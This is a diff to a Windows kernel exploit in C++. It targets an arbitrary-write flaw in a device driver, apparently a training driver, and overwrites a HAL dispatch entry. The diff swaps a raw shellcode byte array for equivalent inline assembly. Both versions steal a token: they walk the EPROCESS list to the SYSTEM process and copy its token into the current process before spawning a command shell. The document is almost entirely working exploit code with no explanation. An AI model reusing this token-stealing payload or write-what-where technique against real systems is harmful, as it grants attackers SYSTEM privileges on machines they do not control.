@@ -15,25 +15,31 @@ typedef NTSTATUS (WINAPI* My_NtQueryIntervalProfile)(
 	IN ULONG ProfileSource,
 	OUT PULONG Interval);
 
-char shellcode[] = (
-	"\x60" // PUSHAD
-	"\x64\xA1\x24\x01\x00\x00" // MOV EAX, fs:[KTHREAD_OFFSET]
-	"\x8B\x40\x50" // MOV EAX, [EAX + EPROCESS_OFFSET]
-	"\x89\xC1" // mov ecx, eax (Current EPROCESS structure)
-	"\x8B\x98\xF8\x00\x00\x00" // mov ebx, [eax + TOKEN_OFFSET]
-							   // #---[Copy System PID token]
-	"\xBA\x04\x00\x00\x00" // mov edx, 4 (SYSTEM PID)
-	"\x8B\x80\xB8\x00\x00\x00" // mov eax, [eax + FLINK_OFFSET] <-|
-	"\x2D\xB8\x00\x00\x00" //               sub eax, FLINK_OFFSET |
-	"\x39\x90\xB4\x00\x00\x00" //      cmp[eax + PID_OFFSET], edx |
-	"\x75\xED" // jnz                                          -> |
-	"\x8B\x90\xF8\x00\x00\x00" // mov edx, [eax + TOKEN_OFFSET]
-	"\x89\x91\xF8\x00\x00\x00" // mov[ecx + TOKEN_OFFSET], edx
-							   //#---[Recover]
-	"\x61" // popad
-	"\x31\xC0" // Set NTSTATUS->STATUS_SUCCESS so calling function thinks we exited successfully
-	"\xC3"
-	);
+static VOID ShellCode() {
+	_asm {
+		pushad
+
+		xor eax, eax
+		mov eax, fs: [eax + 124h]
+
+		mov eax, [eax + 050h]
+
+		mov ecx, eax
+
+		mov edx, 004h
+
+		SearchSystemPID:
+		mov eax, [eax + 0B8h]
+			sub eax, 0B8h
+			cmp[eax + 0x0B4], edx
+			jne SearchSystemPID
+
+			mov edx, [eax + 0F8h]
+			mov[ecx + 0F8h], edx
+
+			popad
+	}
+}
 
 static VOID CreateCmd()
 {
@@ -103,6 +109,7 @@ DWORD32 GetHalOffset_4()
 }
 
 VOID trigger_vuln() {
+	PVOID Payload = &ShellCode;
 	HANDLE hFile = CreateFile(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
 		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
@@ -122,7 +129,7 @@ VOID trigger_vuln() {
 
 	cout << "[+] Allocated Memory at address " << hex << Write_What_Where << endl;
 
-	Write_What_Where->What = (PULONG_PTR)& shellcode;
+	Write_What_Where->What = (PULONG_PTR)& Payload;
 	Write_What_Where->Where = (PULONG_PTR)GetHalOffset_4();
 
 	DWORD byteRet = 0x0;
